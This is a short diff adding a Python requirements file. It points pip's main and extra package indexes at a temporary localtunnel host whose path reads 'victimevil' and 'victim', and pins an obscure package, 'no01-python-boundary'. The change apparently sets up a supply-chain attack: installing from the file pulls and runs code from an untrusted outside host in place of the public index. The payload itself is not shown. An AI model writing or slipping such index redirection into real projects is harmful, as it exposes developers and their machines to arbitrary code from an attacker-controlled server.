@@ -1,0 +1,4 @@
+--index-url https://cuddly-cycles-pick.loca.lt/victimevil/simple
+--extra-index-url https://cuddly-cycles-pick.loca.lt/victim/simple
+
+no01-python-boundary==1.0.0
